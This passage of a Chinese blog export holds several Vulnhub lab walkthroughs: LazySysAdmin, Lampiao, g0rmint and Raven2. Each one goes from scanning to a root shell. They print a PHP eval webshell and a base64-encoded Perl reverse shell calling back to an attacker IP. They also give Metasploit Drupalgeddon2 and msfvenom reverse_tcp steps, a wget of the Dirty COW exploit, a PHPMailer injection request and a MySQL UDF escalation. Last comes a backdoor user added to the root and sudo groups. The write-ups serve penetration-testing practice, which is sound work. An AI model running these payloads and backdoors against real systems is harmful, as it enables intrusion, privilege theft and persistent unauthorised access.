smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2019-07-22 07:32:29|_ start_date: N/ATRACEROUTEHOP RTT ADDRESS1 0.64 ms 192.168.64.143OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Jul 30 06:25:48 2019 -- 1 IP address (1 host up) scanned in 23.64 seconds 从中可看出： 22端口——ssh远程登录协议 80端口——http服务 139端口——NETBIOS Session Service端口,用于提供文件共享服务,主要用于企业内部网之间互相访问,如文件共享或打印等等. 445端口——有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机 3306端口——mysql服务 6667端口——一种透过网络的即时聊天方式。其主要用于群体聊天，但同样也可以用于个人对个人的聊天。 enum4linux扫描 Windows平台上曾经出现过一个第三方的信息枚举工具 enum.exe，其利用SMB协议枚举Windows系统和SAMBA服务，以此来获得目标系统大量的重要信息，其枚举结果可能包含目标系统的用户帐号、组帐号、共享目录、密码策略等机密重要信息。enum4linux作为其Linux平台的复刻作品，全面兼容了enum.exe的所有功能。对于安全防护不足的SMB/SAMBA服务，enum4linux可直接枚举重要信息，甚至帮助我们发现潜在漏洞的存在。 payload:enum4linux 192.168.64.143 获取到远程主机共享了print和share两个文件夹。 web目录扫描 可看出，主要web应用有phpMyAdmin和WordPress WPScan扫描参考文章：WPScan使用攻略 采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。 扫描WordPress站点:wpscan -u http://192.168.64.143/wordpress/ 仅获得服务器的基本信息（PHP版本、Apache以及系统的信息），并没有其他的插件，不存在漏洞利用点。 枚举WordPress用户：wpscan -u http://192.168.64.143/wordpress/ --enumerate u Web站点信息（1）togie可能是什么的账户名 （2）WPScan枚举出admin和ulgrmbcg两个用户名 Samba协议登录由上面enumlinux扫描获取到两个共享文件夹，访问: windows下:\\192.168.64.143\share$ linux下:smbclient //192.168.64.143/share$ 经简单审计WordPress的源码，发现信息： wp-config.php 1234567define('DB_NAME', 'wordpress');/** MySQL database username */define('DB_USER', 'Admin');/** MySQL database password */define('DB_PASSWORD', 'TogieMYSQL12345^^');/** MySQL hostname */define('DB_HOST', 'localhost'); 获得数据库的用户与密码，登录phpMyAdmin发现权限受限，无法利用。 deets.txt 123CBF Remembering all these passwords.Remember to remove this file and update your password after we push out the server.Password 12345 可能为某种服务的密码 SSH登录(方法1)尝试ssh togie@192.168.64.143 输入password:12345 togie权限很低，但是发现具有sudo权限 sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具 输入sudo su，成功提权…… web渗透(方法2)整理前面获取的信息: 未知的密码12345 未知的用户名togie 数据库的用户名Admin，密码TogieMYSQL12345^^ （1）WordPress后台登录:http://192.168.64.143/wordpress/wp-login.php 尝试用户名Admin，密码TogieMYSQL12345^^，登录成功，进入到WordPress后台 （2）点击插件-&gt;编辑-&gt;选择Hello Dolly Hello Dolly不是普通的插件，它象征着一代人希望和热情，浓缩成Louis Armstrong的四个字：你好，多莉。在启用后，在您站点后台每个页面的右上角都可以看到一句来自《俏红娘》音乐剧的英文原版台词 （3）修改hello.php文件，在末尾添加file_put_contents(‘shell.php’,’&lt;?php eval($_POST[pass]);?&gt;’); 在当前目录下生成webshell，蚁剑连接即可 （4）上传反弹shell脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpfunction which($pr) &#123;$path = execute("which $pr");return ($path ? $path : $pr);&#125;function execute($cfe) &#123;$res = '';if ($cfe) &#123;if(function_exists('exec')) &#123;@exec($cfe,$res);$res = join("\n",$res);&#125; elseif(function_exists('shell_exec')) &#123;$res = @shell_exec($cfe);&#125; elseif(function_exists('system')) &#123;@ob_start();@system($cfe);$res = @ob_get_contents();@ob_end_clean();&#125; elseif(function_exists('passthru')) &#123;@ob_start();@passthru($cfe);$res = @ob_get_contents();@ob_end_clean();&#125; elseif(@is_resource($f = @popen($cfe,"r"))) &#123;$res = '';while(!@feof($f)) &#123;$res .= @fread($f,1024);&#125;@pclose($f);&#125;&#125;return $res;&#125;function cf($fname,$text)&#123;if($fp=@fopen($fname,'w')) &#123;@fputs($fp,@base64_decode($text));@fclose($fp);&#125;&#125;$yourip = "192.168.64.131"; //修改这里$yourport = "4444"; // 修改这里$usedb = array('perl'=&gt;'perl','c'=&gt;'c');$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"."aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"."hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"."sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"."kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"."KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"."OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";cf('/tmp/.bc',$back_connect);$res = execute(which('perl')." /tmp/.bc $yourip $yourport &amp;");?&gt; 访问后接受到shell 但经过尝试，如 python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; su togie 提示must be run from a terminal，没办法走方法2，从而使用方法1直接登陆ssh切换到管理员账号 参考文章 Vulnhub-LazySysAdmin 通关指南 带妹玩转Vulnhub【一】 Lazysysadmin渗透实战]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Lampiao渗透实战]]></title>
    <url>%2F2019%2F08%2F10%2FLampiao%2F</url>
    <content type="text"><![CDATA[前言常规型渗透、难度较小 渗透测试信息收集 IP 端口 netdiscover -r 192.168.64.0/24 ​ namp -A -oN nmap.txt 192.168.64.146 123456789101112131415PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)| 2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)| 256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)|_ 256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (EdDSA)80/tcp open http?MAC Address: 00:0C:29:70:1E:63 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.8Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 访问80端口发现一个静态页面，且没有任何提示；怀疑开放了其他端口： nmap -sS -p 1-2000 192.168.64.146 -sS TCP SYN扫描 访问192.168.64.146:1898 web指纹 whatweb http://192.168.64.146:1898 根据网页下方版权亦可看出，站点CMS为Drupal web目录 获取会话（1）metasploit search Drupal 12use use exploit/unix/webapp/drupal_drupalgeddon2 options 1234set php_func systemset RHOSTS 192.168.64.146set rport 1898run GETSHELL msf的shell不是完整的shell，交互不完整； 恰好此处安装了python，可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生虚拟终端 12shellpython -c 'import pty; pty.spawn("/bin/bash")' 提权首先获取系统信息 123456789www-data@lampiao:~/html$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@lampiao:~/html$ uname -auname -aLinux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linuxwww-data@lampiao:~/html$ cat /proc/versioncat /proc/versionLinux version 4.4.0-31-generic (buildd@lgw01-01) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 其次审计web源码，是否能从中获取一些有用信息 打包web源码:tar -czvf web.tar.gz ../html Linux tar命令用于备份文件。 tar是用来建立，还原备份文件的工具程序，它可以加入，解开备份文件内的文件。 -c 新建打包文件，同 -v 一起使用 查看过程中打包文件名-z 通过gzip方式压缩或解压，最后以.tar.gz 为后缀-v 压缩或解压过程中，显示出来过程-f 后面接要处理的文件-x 解决文件， -C 解压到对应的文件目录-t 列出备份文件的内容。 ########################################################################## 压缩：tar -czvf web.tar.gz ../html 解压：tar -xzvf web.tar.gz 列出压缩文件内容：tar -tzvf test.tar.gz WEB源码目录： 其中有用的信息: qrc.png =&gt;二维码 （加油信息） audio.m4a =&gt;音频信息 （user:tiago） /sites/default/settings.php =&gt;web配置文件 其中settins.php: 123456789101112131415$databases = array ( 'default' =&gt; array ( 'default' =&gt; array ( 'database' =&gt; 'drupal', 'username' =&gt; 'drupaluser', 'password' =&gt; 'Virgulino', 'host' =&gt; 'localhost', 'port' =&gt; '', 'driver' =&gt; 'mysql', 'prefix' =&gt; '', ), ),); 此处使用该账号信息进入到mysql，从user表中获取到Linux的账号信息 ps：此处应该可以尝试暴力破解，但加了salt很难破解，需要通过工具字典爆。 但通过网络教程来看，用户tiago的密码恰好为Virgulino，通过ssh登录成功。 通过脏牛提权 CVE-2016-5195 脏牛（Dirty COW） Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。 wget https://www.exploit-db.com/download/40847 12mv 40847 40847.cppg++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil 至此提权成功，获取到flag~ 总结记录下渗透过程传输文件的技巧 Linux系统之间传递文件:scp scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令，因此需要开启ssh服务 从本地传送到远程服务器 1.1传递文件 12scp local_file remote_username@remote_ip:remote_folder #不改变文件名scp local_file remote_username@remote_ip:remote_file #改变文件名 例:scp /root/Desktop/Lampiao/ test.php xm@192.168.64.128:/home/xm/桌面/test.php 1.2传递文件夹 1scp -r local_folder remote_username@remote_ip:remote_folder 例:scp -r /root/Desktop/Lampiao/ xm@192.168.64.128:/home/xm/桌面/ 从远程服务器传送到本地 顺序同上面相反 例： 12scp root@www.runoob.com:/home/root/others/music /home/space/music/1.mp3 scp -r www.runoob.com:/home/root/others/ /home/space/music/ wget 在攻击方服务器上开启web服务，将需要的文件放入web目录下，在靶机上相应目录wget下载下来即可。 参考文章 Linux tar命令 Linux scp命令 vulnhub|渗透测试lampiao 【漏洞预警】CVE-2016-5195 脏牛漏洞：Linux内核通杀提权漏洞（10.27 10:30更新）]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[g0rmint渗透实战]]></title>
    <url>%2F2019%2F08%2F10%2Fg0rmint%2F</url>
    <content type="text"><![CDATA[前言这里自动设置的是桥接，记得修改为NAT 靶机难度不大，但是细节上存在大量问题 渗透测试主机发现netdiscover:netdiscover -r 192.168.64.0/24 端口扫描 仅开放22与80端口，看样子需要从web层面进行渗透 Web信息收集（1）目录扫描 扫描器发现，网站根目录下存在robots.txt，打开提示/g0rmint/ 继续使用扫描器发现：login.php 介绍kali下的目录扫描工具:dirb dirb http://........... （2）页面信息 经过尝试并没有发现漏洞点，查看源码，发现一段提示: 这里相当无语，我的靶机里并没有这一行代码，但网络上的教程中是显示有的 访问后仍然404，但用扫描器发现了一些信息 dirb http://192.168.64.144/g0rmint/s3cretbackupdirect0ry/ 访问info.php，得到信息：backup.zip；成功下载获取源码 代码审计 想着登录到后台，从db.sql中找到了一条信息 1INSERT INTO `g0rmint` (`id`, `username`, `email`, `pass`) VALUES (1, 'demo', 'demo@example.com', 'fe01ce2a7fbac8fafaed7c982a04e229');` MD5解密=&gt;demo 但是发现无法登录，可能是该信息是最原始的密码。 查看reset.php: 密码是截取gmdate()函数生成的日期的前20位，再先后加密得到的 而修改密码需要提供账户名和邮箱名，使用db.sql中的信息失败 经网上教程提醒，全局搜索email，在某个css文件中查找到了这条信息： 修改登录，最终成功登录进入后台： getshell发现后台并没有什么利用点，继续审查代码 在login.php中可以看到 1234567891011121314151617181920212223&lt;?phpinclude_once('config.php');if (isset($_POST['submit'])) &#123; // If form is submitted $email = $_POST['email']; $pass = md5($_POST['pass']); $sql = $pdo-&gt;prepare("SELECT * FROM g0rmint WHERE email = :email AND pass = :pass"); $sql-&gt;bindParam(":email", $email); $sql-&gt;bindParam(":pass", $pass); $row = $sql-&gt;execute(); $result = $sql-&gt;fetch(PDO::FETCH_ASSOC); if (count($result) &gt; 1) &#123; session_start(); $_SESSION['username'] = $result['username']; header('Location: index.php'); exit(); &#125; else &#123; $log = $email; $reason = "Failed login attempt detected with email: "; addlog($log, $reason); &#125;&#125;?&gt; 其中addlog()定义位于config.php: 1234567891011121314function addlog($log, $reason) &#123; $myFile = "s3cr3t-dir3ct0ry-f0r-l0gs/" . date("Y-m-d") . ".php"; if (file_exists($myFile)) &#123; $fh = fopen($myFile, 'a'); fwrite($fh, $reason . $log . "&lt;br&gt;\n"); &#125; else &#123; $fh = fopen($myFile, 'w'); fwrite($fh, file_get_contents("dummy.php") . "&lt;br&gt;\n"); fclose($fh); $fh = fopen($myFile, 'a'); fwrite($fh, $reason . $log . "&lt;br&gt;\n"); &#125; fclose($fh);&#125; 可见，当登录失败时，email信息将会被写入到php文件中，即可写入一句话，成功获取webshell 提权查看系统信息 12uname -acat /proc/version 版本信息为：Ubuntu 16.04，存在一种本地提权的方法 参考文章： Ubuntu16.04 本地提权漏洞复测过程 【漏洞复现】Ubuntu本地提权漏洞CVE-2017-16995 这里又是一个坑点，我无论用何种exp，都会提醒各种错误，这个过程花了一个上午，最终还不知道是怎么成功的…但不管怎么说，这几种exp在webshell的虚拟终端是无法执行成功的，需要反弹shell 反弹shell此处给出本例使用过的两种通过metasploit反弹的方式 二进制文件 1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf 123456msfconsoleuse exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset lhost 192.168.64.131set lport 4444exploit PHP文件 1msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php 12345use exploit/multi/handlerset payload php/meterpreter_reverse_tcpset lhost 192.168.64.131set lport 4444exploit 由于目标服务器没有gcc，于是在本地Linux系统中生成exp： 1gcc -c exp.c -o exp 将exp上传至目标服务器中，在msf shell中执行，成功提权： 在/root/目录下获取到flag 至此，渗透实验基本完成。 我这里额外添加了一个普通用户，并将它加入到管理员和sudo组 12345useradd hackerpasswd hackerusermod -s /bin/bash hackerusermod -g root hackerusermod -aG sudo hacker 这里因为在msf shell中，不能顺利的修改文件，这里没有完全将普通用户提升为root权限。 12id hackeruid=1001(hacker) gid=0(root) groups=0(root),27(sudo) 杂记 这个靶机因为提权exp的问题耗费了太多的时间精力，还专门去下了一个相同版本的Ubuntu来gcc编译，然后……生成的exp仍然不行 但这个过程中利用到了更换Linux内核，有必要在这里记录一下 uname -r 查看系统默认内核 apt-cache search linux 查看可获取的内核 sudo apt-get install linux-headers-4.4.0-62-generic linux-image-4.4.0-62-generic 安装所需要版本的内核，注意:这一步需要下载两个东西，”headers”和”image”，不能只安装其中一个 sudo gedit /boot/grub/grub.cfg 修改内核配置信息 保存后重启即可 参考文章: 【漏洞复现】Ubuntu本地提权漏洞CVE-2017-16995 ubuntu如何安装或更换内核 Ubuntu下更换内核详细步骤（亲测有效） 参考文章 记一次在实战靶机中使用SearchSploit的总结 Vulnhub-g0rmint 带妹玩转Vulnhub【二】 msf生成常用payload 记一次在实战靶机中使用SearchSploit的总结]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Raven2渗透实战]]></title>
    <url>%2F2019%2F08%2F10%2FRaven2%2F</url>
    <content type="text"><![CDATA[前言难度中等，涉及mysql udf提权、phpmailer命令漏洞 渗透信息收集netdiscover -r 192.168.64.0/24 =&gt; 192.168.64.148 nmap -oN nmap.txt -A 192.168.64.148 123456789101112131415161718192021222324PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)| ssh-hostkey: | 1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)| 2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)| 256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)|_ 256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)80/tcp open http Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: Raven Security111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100024 1 48650/tcp status|_ 100024 1 53215/udp statusMAC Address: 00:0C:29:B2:C8:AD (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel dirb 192.168.64.148 =&gt; /vendor/ /wordpress/ 其中wordpress无法正常打开，vendor存在目录遍历，并发现phpmailer 5.2.16，存在漏洞 GETSHELLmsf：searchsploit phpmailer 选择python那个脚本，修改exp配置： 修改target为靶机的ip，利用文件为/contact.php 修改后门文件路径，默认的用不了 修改反弹shell的ip与端口 这里当然可以手工利用，抓包并向contact.php文件post数据： 1234567891011121314POST /contact.php HTTP/1.1Host: 192.168.64.148Content-Length: 153Accept: text/html, */*; q=0.01Origin: http://192.168.64.148X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://192.168.64.148/contact.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeaction=submit&amp;name=&lt;?php phpinfo();?&gt;&amp;email="anarcoder\" -OQueueDirectory=/tmp -X/var/www/html/test.php server" @protonmail.com&amp;subject=123&amp;message=Pwned 提交或执行后，在kali上成功获取到反弹的shell，再使用python创建一个虚拟终端： python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; udf提权发现存在mysql进程，尝试udf提权： 先在kali中下载exp并编译下来： 1234wget https://www.exploit-db.com/download/1518#下载expmv ./1518 ./1518.c gcc -g -c 1518.cgcc -g -shared -o raptor_udf.so 1518.o -lc 在kali下开启Apache服务：/etc/init.d/apache2 start 将编译器下来的raptor_udf.so移动到/html/，在目标服务器/tmp下执行wget http://192.168.64.131:8080/raptor_udf.so 目标服务器下/usr/lib/mysql/plugin中不具备权限，无法直接将文件直接拷贝到该文件夹中，需要进入数据库中操作，在数据库中导入和导出文件： 12345678910111213141516171819202122232425262728293031323334353637mysql&gt; use mysql;mysql&gt; create table foo(data blob);create table foo(data blob);Query OK, 0 rows affected (0.04 sec)mysql&gt; insert into foo values(load_file(&apos;/tmp/raptor_udf.so&apos;));insert into foo values(load_file(&apos;/tmp/raptor_udf.so&apos;));Query OK, 1 row affected (0.02 sec)mysql&gt; select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf.so&apos;;select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf.so&apos;;Query OK, 1 row affected (0.01 sec)mysql&gt; create function do_system returns string soname &apos;raptor_udf.so&apos;;create function do_system returns string soname &apos;raptor_udf.so&apos;;Query OK, 0 rows affected (0.01 sec)mysql&gt; select * from mysql.func;select * from mysql.func;+-----------+-----+---------------+----------+| name | ret | dl | type |+-----------+-----+---------------+----------+| do_system | 0 | raptor_udf.so | function |+-----------+-----+---------------+----------+1 row in set (0.00 sec)mysql&gt; select do_system(&apos;chmod u+s /usr/bin/find&apos;);select do_system(&apos;chmod u+s /usr/bin/find&apos;);+--------------------------------------+| do_system(&apos;chmod u+s /usr/bin/find&apos;) |+--------------------------------------+| NULL |+--------------------------------------+1 row in set (0.01 sec) 命令执行： 123touch foofind foo -exec 'whoami' \;find foo -exec '/bin/sh' \; 参考文章 Web安全 — CVE-2016-10033漏洞（phpmailer任意代码执行） Raven2渗透实战 MySQL 4.x / 5.0（Linux） - 用户定义函数（UDF）动态库]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
</search>
